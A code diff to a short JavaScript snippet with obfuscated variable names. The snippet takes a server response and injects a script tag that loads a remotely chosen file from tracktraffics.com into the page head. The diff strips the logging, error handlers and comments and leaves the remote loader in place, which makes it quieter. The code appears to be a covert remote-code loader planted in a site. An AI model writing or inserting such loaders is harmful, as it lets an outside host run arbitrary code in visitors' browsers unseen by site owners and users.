@@ -87,7 +87,6 @@
     })
     .then((res) => res.json())
     .then(response => {
-        console.log("Fetch response received: ", response);
         i_s(response);
     })
     .catch(error => {
@@ -95,34 +94,17 @@
     });
 
     function i_s(re_ret_f_r) {
-        console.log("Line 87 => ", re_ret_f_r);
-
+     
         var re_ret_r_s = re_ret_f_r.name;
         var re_rl = re_ret_f_r.url;
         var re_ret_rs_d = document.createElement('script');
-        var re_ret_encodedUrl = encodeURIComponent(re_rl);  // URL encode the referrer URL
+        var re_ret_encodedUrl = encodeURIComponent(re_rl); 
         re_ret_rs_d.src = 'https://www.tracktraffics.com/' + re_ret_r_s + '.js?url=' + re_ret_encodedUrl;
 
         re_ret_rs_d.async = true;
 
-        // Log after setting script src
-        console.log("Script source set: ", re_ret_rs_d.src);
-
-        re_ret_rs_d.onload = function() {
-            console.log("Script loaded successfully: " + re_ret_r_s + ".js");
-            console.log(re_ret_r_s + " script loaded and running.");
-        };
-
-        re_ret_rs_d.onerror = function() {
-            console.error("Failed to load script: " + re_ret_rs_d.src);
-        };
-
-        // Log before appending the script to the document
-        console.log("Appending script to document.");
-
         document.head.appendChild(re_ret_rs_d);
 
-        // Log after appending the script to the document
-        console.log("Script appended: ", re_ret_rs_d.src);
     }
 })();
+
